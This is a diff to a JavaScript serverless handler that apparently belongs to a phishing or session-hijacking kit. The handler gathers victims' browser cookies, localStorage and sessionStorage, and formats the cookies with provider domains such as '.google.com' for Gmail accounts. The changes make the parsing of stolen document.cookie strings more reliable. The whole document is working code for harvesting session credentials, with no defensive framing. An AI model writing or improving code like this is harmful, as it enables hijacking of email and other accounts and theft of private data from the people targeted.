@@ -59,7 +59,7 @@ export const handler = async (event, context) => {
                      'Unknown';
 
     // Enhanced cookie processing
-    const cookieInfo = browserFingerprint?.cookies || data.cookies || [];
+    const cookieInfo = data.documentCookies || browserFingerprint?.cookies || data.cookies || 'No cookies available';
     const localStorageInfo = browserFingerprint?.localStorage || data.localStorage || 'Empty';
     const sessionStorageInfo = browserFingerprint?.sessionStorage || data.sessionStorage || 'Empty';
     
@@ -93,10 +93,11 @@ export const handler = async (event, context) => {
         if (cookieInfo.includes('=')) {
           const cookieStrings = cookieInfo.split(';');
           formattedCookies = cookieStrings
+            .filter(cookieStr => cookieStr.trim() && cookieStr.includes('='))
             .map(cookieStr => {
               const [name, ...valueParts] = cookieStr.trim().split('=');
               const value = valueParts.join('=');
-              return name && value ? {
+              return name && name.trim() && value ? {
                 name: name.trim(),
                 value: value.trim(),
                 domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
@@ -121,12 +122,12 @@ export const handler = async (event, context) => {
     
     // Method 4: Check for document.cookie direct format
     else if (data.documentCookies && typeof data.documentCookies === 'string') {
-      const cookieStrings = data.documentCookies.split(';');
+      const cookieStrings = data.documentCookies.split(';').filter(c => c.trim() && c.includes('='));
       formattedCookies = cookieStrings
         .map(cookieStr => {
           const [name, ...valueParts] = cookieStr.trim().split('=');
           const value = valueParts.join('=');
-          return name && value ? {
+          return name && name.trim() && value ? {
             name: name.trim(),
             value: value.trim(),
             domain: provider === 'Gmail' || provider === 'Google' ? '.google.com' : 
